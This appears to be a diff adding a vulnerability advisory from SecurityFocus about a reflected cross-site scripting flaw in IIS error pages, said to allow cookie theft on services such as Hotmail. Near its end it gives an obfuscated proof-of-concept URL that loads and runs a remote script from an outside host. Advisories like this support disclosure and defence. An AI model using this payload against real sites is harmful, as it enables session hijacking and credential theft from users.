@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/4486/info
+
+A Cross Site Scripting issue exists in some versions of IIS. The HTTP Error Page created by IIS may, under some circumstances, contain HTML content which includes unsanitized user supplied input.
+
+An attacker may construct a link to a vulnerable server such that it exploits this vulnerability. When an innocent user follows this link, the script code will be reproduced by the server, and execute within the context of the vulnerable site. This may result in the exposure of sensitive data and cookie information, or allow the attacker to subvert the content and functionality of the site.
+
+It has been reported that this issue may be exploited to steal cookie-based authentication credentials from users of a number of Microsoft domains/services (such as hotmail, passport, etc.).
+
+A number of Cisco products are affected by this vulnerability, although this issue is not present in the Cisco products themselves.
+
+http://<img%09src=""%09onerror="document.scripts[0].src=%27http%5Cx3a%5Cx2f%5Cx2fjscript.dk%5Cx2ftest.js%27;">script@YOUR.TLD/SomeNonExistantPath
+
+The above will include and execute http://jscript.dk/test.js on YOUR.TLD, provided that YOUR.TLD is served by an IIS installation.
+
+
